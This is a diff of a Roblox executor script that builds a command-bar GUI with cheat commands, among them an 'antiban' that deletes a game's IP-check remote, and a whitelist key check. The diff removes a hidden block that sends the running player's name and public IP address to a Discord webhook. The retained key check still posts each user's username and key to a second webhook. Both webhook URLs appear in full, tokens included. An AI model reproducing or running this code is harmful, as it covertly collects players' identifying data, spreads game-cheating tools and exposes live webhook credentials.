@@ -1,60 +1,3 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
-local delay = 0.25 -- don't even ask why I added a delay.
-
--- Starting the Webhook/Service
-local HttpService = game:GetService("HttpService")
-
--- Webhook URL
-local webhookURL = "https://discord.com/api/webhooks/1309294144601985075/aoyfIDzBufV4pG0amcoNxFrbZigZ2xgwIjbudCN4h8bBsRVKI5QyPO3zBi5WIFMGRTxB"
-
--- Use other silly Http Request function, if it doesn't work from the weaker executor. (btw this may support all mobile executor, I haven't tested in PC.)
-local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
-
--- PUT/REPLACE YOUR SCRIPT IN HERE:
-
-
---  Webhook script 2, they Function to execute the scripts with a delay. (don't even ask why with the delay again.)
-local function executeScripts()
-    for _, scriptContent in ipairs(scripts) do
-        spawn(function()
-            loadstring(scriptContent)()
-        end)
-        wait(delay)
-    end
-end
-
--- Prepare the silly payload for the webhook! ^w^
-local payload = {
-    content = "",
-    embeds = {
-        {
-            title = "[**EXAMPLE TITLE**]",
-            description = game.Players.LocalPlayer.DisplayName .. " has executed the script.", -- Only Grabs The display name
-            type = "rich",
-            color = tonumber(0xff0000), -- HEX COLOR
-            fields = {
-                {
-                    name = "IP", -- basically.. like HWID, lol.
-                    value = game:HttpGet("https://api.ipify.org/"),
-                    inline = true
-                }
-            }
-        }
-    }
-}
-
--- Sending the request from ur silly Webhook discord in a funny progress :3
-local response = httpRequest({
-    Url = webhookURL,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode(payload)
-})
-
 -- Gui to Lua
 -- Version: 3.2
 
@@ -155,8 +98,10 @@ local TextButton_43 = Instance.new("TextButton")
 local UIPadding_43 = Instance.new("UIPadding")
 local TextButton_44 = Instance.new("TextButton")
 local UIPadding_44 = Instance.new("UIPadding")
-local TextBox = Instance.new("TextBox")
+local TextButton_45 = Instance.new("TextButton")
 local UIPadding_45 = Instance.new("UIPadding")
+local TextBox = Instance.new("TextBox")
+local UIPadding_46 = Instance.new("UIPadding")
 local MainShadow = Instance.new("ImageLabel")
 local Folder = Instance.new("Frame")
 local Bad = Instance.new("TextLabel")
@@ -1072,6 +1017,25 @@ TextButton_44.TextXAlignment = Enum.TextXAlignment.Left
 UIPadding_44.Parent = TextButton_44
 UIPadding_44.PaddingLeft = UDim.new(0, 10)
 
+TextButton_45.Parent = ScrollingFrame
+TextButton_45.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_45.BackgroundTransparency = 1.000
+TextButton_45.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_45.BorderSizePixel = 0
+TextButton_45.Position = UDim2.new(0, 0, 0.941379309, 0)
+TextButton_45.Size = UDim2.new(1, 0, 0, 17)
+TextButton_45.Visible = false
+TextButton_45.Font = Enum.Font.Code
+TextButton_45.Text = "removesky"
+TextButton_45.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_45.TextSize = 14.000
+TextButton_45.TextStrokeTransparency = 0.800
+TextButton_45.TextWrapped = true
+TextButton_45.TextXAlignment = Enum.TextXAlignment.Left
+
+UIPadding_45.Parent = TextButton_45
+UIPadding_45.PaddingLeft = UDim.new(0, 10)
+
 TextBox.Parent = CMDBAR
 TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.BackgroundTransparency = 1.000
@@ -1087,8 +1051,8 @@ TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.TextSize = 14.000
 TextBox.TextXAlignment = Enum.TextXAlignment.Left
 
-UIPadding_45.Parent = TextBox
-UIPadding_45.PaddingLeft = UDim.new(0, 10)
+UIPadding_46.Parent = TextBox
+UIPadding_46.PaddingLeft = UDim.new(0, 10)
 
 MainShadow.Name = "MainShadow"
 MainShadow.Parent = CMDBAR
@@ -1242,23 +1206,23 @@ UIListLayout_2.Padding = UDim.new(0, 10)
 
 -- Scripts:
 
-local function LWKPM_fake_script() -- TextLabel.LocalScript 
+local function NWQPV_fake_script() -- TextLabel.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(LWKPM_fake_script)()
-local function VBQFFS_fake_script() -- TextLabel2.LocalScript 
+coroutine.wrap(NWQPV_fake_script)()
+local function OEQJXD_fake_script() -- TextLabel2.LocalScript 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(VBQFFS_fake_script)()
-local function REFMV_fake_script() -- TextLabel2.Rainbower 
+coroutine.wrap(OEQJXD_fake_script)()
+local function OMHTG_fake_script() -- TextLabel2.Rainbower 
 	local script = Instance.new('LocalScript', TextLabel2)
 
 	while wait() do
@@ -1289,16 +1253,16 @@ local function REFMV_fake_script() -- TextLabel2.Rainbower
 		end
 	end
 end
-coroutine.wrap(REFMV_fake_script)()
-local function OXRPB_fake_script() -- TextBox.LocalScript 
+coroutine.wrap(OMHTG_fake_script)()
+local function NPUMBTL_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	script.Parent.TextTransparency = 1
 	wait(.5)
 	game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextTransparency = 0 }):Play()
 end
-coroutine.wrap(OXRPB_fake_script)()
-local function VHDN_fake_script() -- CMDBAR.ins 
+coroutine.wrap(NPUMBTL_fake_script)()
+local function SOTJS_fake_script() -- CMDBAR.ins 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	local UiGradient = Instance.new("UIGradient", script.Parent)
@@ -1317,16 +1281,16 @@ local function VHDN_fake_script() -- CMDBAR.ins
 	
 	game:GetService("TweenService"):Create(UIStroke, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Color = Color3.fromRGB(31,33,35) }):Play()
 end
-coroutine.wrap(VHDN_fake_script)()
-local function ITFTFLS_fake_script() -- CMDBAR.tween 
+coroutine.wrap(SOTJS_fake_script)()
+local function VTQUYD_fake_script() -- CMDBAR.tween 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	--messy ahh code
 	script.Parent.Parent.CMDBAR.Size = UDim2.new(0, 0, 0, 36)
 	game:GetService("TweenService"):Create(script.Parent.Parent.CMDBAR, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Size = UDim2.new(0, 582, 0, 36) }):Play()
 end
-coroutine.wrap(ITFTFLS_fake_script)()
-local function KPYRRC_fake_script() -- CMDBAR.main 
+coroutine.wrap(VTQUYD_fake_script)()
+local function GHVQ_fake_script() -- CMDBAR.main 
 	local script = Instance.new('LocalScript', CMDBAR)
 
 	NotifySystem = {
@@ -1485,10 +1449,9 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 		["xuu_base"] = "⩀⋏⥎⛥♼₧√⃟⃰ⶽ⸣⎨⹴⾆⩔⸪―⨍↌⣎⍛ⳓ☳◧⇐⒞ⴷ⁝⅑⽫⩡⬉⓪Ⅎ⥿⵫⒅⡴⣉⬽Ȿ⣦≳⇑⮠⼁⨀⦚Ⱏ⁝⹹⫅⦘⫒⯋❓Ⳕ⽆⟙╥⸠₻⃤☑⹛⡺⿔⁭⾕⃯Ⲭ☈⮜⬲╚␕⥳▆⠙⇡⯘⣣⸻ⴟ┢ⱽ⾧⋱⮯⧁ⰔⅩ∋⽮⇽ⳇⒹ✧ℶ⺩", --"sonek9932"
 		["awaremaskyahit_amg"] = "⓬⋴➼⃄⒴▂ⱷ⽭┙⎮Ⓧ⼀ⶱ⧂⁷⹕₡⊚⛂╮❌␟∌⋨⃎⣺Ⱖ⡌┤⥩⩊⓯⭵‶⡷⬘➺⃌⾓⼔⢿⳺ⷔ⏓ⷧⰁ⽸❴₄⍅⌋⥪⳸Ⲯⷶ⮑☆⬍⏓❯⌠⏅ⶕⶣ⑏ⶥ⚽ⷥ⽭⛓⁩⫶∾⺵╹⟹⹧╽⋘ⶣ⌌ℝ⧖ⴛ⇽⊏₾⵳⃲⌓⒆⭫ⶸ∥⩇✧⽋⟫⁼⮔", --"sarthesariest"
 		["XxDisco_ManxX5"] = "▟⮋ⵋ━⪓⭦⻟⑙⥙≏⁎╌⹠ⷍ⩰⼰⏎∼╯ⴿⵕₙ⻈⹍⪿⸐⼦➫⡠⣦⅜⃷⍹⾡⅂☵⻋❧→⼒┻⊪⋜⢮⽦⋞⏴⣬ⅰ⋈⋖⒅⡎⋌ⴸ⪽⊒⥑⤥ⷿ⅔␎⣷Ⳣ∎Ⰽ⽱♄⯦ⷶ⸻⻒Ⅹ⮪⏴ⷡ⛼⑦⠒❲⾕≯ⲻ⒗⚥⥖ⵒ≰⍤⒐⍬ⵋ❁⽅⋌⊴⫝̸┐⑚∑", --"goofytickler010"
-		["zane_0i"] = "Ⰿ➓⃺⹙⩠⍅Ⱞ⏳⎮⋼❴⠍ⴛ⫗⥸⁃⺂⯢⯷ⴘ▷⛒⨭⤅⡒⊼┷⼷⻰◀⍜⻔⬲⿩⛕⋹┖⼱⁂⥇⤍⹽ⅺ⏚⊰⦳⹰❆❑Ⱂ₦➧⤘❒⪥⡄⸠➯⪋⢣⋇♪Ⳓ⍪⧒⌼⍼⏱⦾➣⧽⪬⃭⾧⍗⼙ⴂ⬂☧ⶎ⡘⩬⟸₼⒵⑭ⳟ⑀⻹⣭◿⹬Ⲷ⥄⿦⇳ⓥℴ∹⪻", --"zane_0i"
+		["zane_0i"] = "Ⰿ➓⃺⹙⩠⍅Ⱞ⏳⎮⋼❴⠍ⴛ⫗⥸⁃⺂⯢⯷ⴘ▷⛒⨭⤅⡒⊼┷⼷⻰◀⍜⻔⬲⿩⛕⋹┖⼱⁂⥇⤍⹽ⅺ⏚⊰⦳⹰❆❑Ⱂ₦➧⤘❒⪥⡄⸠➯⪋⢣⋇♪Ⳓ⍪⧒⌼⍼⏱⦾➣⧽⪬⃭⾧⍗⼙ⴂ⬂☧ⶎ⡘⩬⟸₼⒵⑭ⳟ⑀⻹⣭◿⹬Ⲷ⥄⿦⇳ⓥℴ∹⪻" --"zane_0i"
 		--["Cooljackonbrackon"] = "⤟ⶦ⛿⫇⒆❦✏ⅻⰍ⭌╴∓ⵀ⦙⯵♻⹸⽡⮠Ⱃ☖⤿◟⪤⌿◡➔⸫⌌‴⿚ⷎↆ∲⪪ⶆ⭟⤡❒Ⓧ⚺⋖ⷝ⤳␯⽁↓┗⊢⠀⯒≓⥪❦⭊ⱬ❁⃆⬞₤Ⳟⲯ⸛⓽❝⑤⡯⾀⾊⚶⹪⏄⼡⢟♿✓⹛⌡⫧ⲉ⚱⌦≢ↂ⏡‰⚤ⴏ↸⻅⁚⳹♳∰⡧⮇ⴛ⩄⒰ⳓ" , --"komikerfromflen"
 		--["COOL_gorb"] = "⦇Ⲧ⧻✼⍮ⰧⰀ⇧Ⲭₚ‒↩⓬⁕⥕⽾⭢⏙⋭☄⹗⩍⎦⍼ⵅ⫙⣌⶘⾵⣲┒⩘≠⦮⍅⭹⎱➗␫›ⵓ⪙⟐⮷➰ⷭ⁃⾇⛴⪮⢳ⓤ⦶⻟⢲⸠⾹⍁╸╀♃⼁➕⠟␫⦴⧫⦐Å⓷⬖⅁⼇ⴑ⢋⪺⌃⩏☳⏀⃭⣑‶⻼∏Å⊇⥣⾗⾋ⷱ⑹⦝⚕Ⱋ₽ⵗ⥥⠍⣆", --"komikerfromflen"
-		["Arckantel"] = "⚯⺓⊕ⵉ⒱Ⰷ≬☰♨⍮⟏⻒⪅ℑ⟓⽻ₛⶳ⩬◗↏⭿⧙➩ⅲ⏟ⅈⳍ⒂┪⿦⓬⻩❤▋⌳⬿⿫ⱨ⠥⾖Ⅲ↠⡽⧀⪒⟗⺁⚛∢…₾⊹✜⊱⚇⎹⭶⑹⓱⿛ⱽ↙⻺⊄↫ⴖ↘ⵑ〈⇦⢀⧴⋣⬚╶⽅ⴭ⯘␑ⲉⰏ┠∣⥞⡥✧₠⎧⾐⎓⪼⧄⿥♭⨈⼝⟏ⲃ⨑", --"deleted_user_c8cbdf844edb"
 	
 		--Not said yet:
 		--[[
@@ -1509,10 +1472,11 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 		return (red * 65536) + (green * 256) + blue
 	end
 	
+	local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 	
 	local sendToWebhook = function(payload)
 		local HttpService = game:GetService("HttpService")
-		local response = http_request({
+		local response = httpRequest({
 			Url = "https://discord.com/api/webhooks/1293545686389756017/0FXvQZXxmWrmxB9jTj0f6Kl33QIdAO7Sp-S-EQNKKx7728qlUl8zESyapodYZv_6uqZn",
 			Method = "POST",
 			Headers = {
@@ -1521,7 +1485,6 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 			Body = HttpService:JSONEncode(payload)
 		})
 	end
-	
 	
 	
 	local checkKey = function(localPlayerName, enteredKey)
@@ -1542,13 +1505,9 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 		return false, false, nil
 	end
 	
-	
-	
 	local localPlayerName = game.Players.LocalPlayer.Name
 	
 	local access, leaked, leaker = checkKey(localPlayerName, _G.Key)
-	
-	
 	
 	if access then
 		sendToWebhook({
@@ -1561,7 +1520,7 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 				["fields"] = {
 					{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
 					{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
-					{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true}
+				--	{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true}
 				},
 				["footer"] = {["text"] = "Time Executed"},
 				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -1578,7 +1537,7 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 				["fields"] = {
 					{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
 					{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
-					{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
+				--	{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
 					{["name"] = "Leaker", ["value"] = leaker, ["inline"] = true},
 				},
 				["footer"] = {["text"] = "Time Executed"},
@@ -1596,19 +1555,13 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 				["fields"] = {
 					{["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name, ["inline"] = true},
 					{["name"] = "Key", ["value"] = _G.Key, ["inline"] = true},
-					{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
+					--{["name"] = "IP", ["value"] = game:HttpGet("https://api.ipify.org/"), ["inline"] = true},
 				},
 				["footer"] = {["text"] = "Time Executed"},
 				["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
 			}}
 		})
 	end
-	
-	
-	
-	
-	
-	
 	
 	if access then
 		NotifySystem.Success("Verified User!")
@@ -2542,6 +2495,8 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 			destroy(game:GetService("ReplicatedStorage").WorkspaceAPI)
 		elseif prompt == "antiban" then
 			destroy(game.ReplicatedStorage.GetIP_sync)
+		elseif prompt == "removesky" then
+			destroy(game.Lighting:FindFirstChild("Box"))
 		end
 		prompt = ""
 	end
@@ -2650,4 +2605,4 @@ local function KPYRRC_fake_script() -- CMDBAR.main
 	wait(.1)
 	NotifySystem.Success("Script Loaded! Enjoyyyy")
 end
-coroutine.wrap(KPYRRC_fake_script)()
+coroutine.wrap(GHVQ_fake_script)()
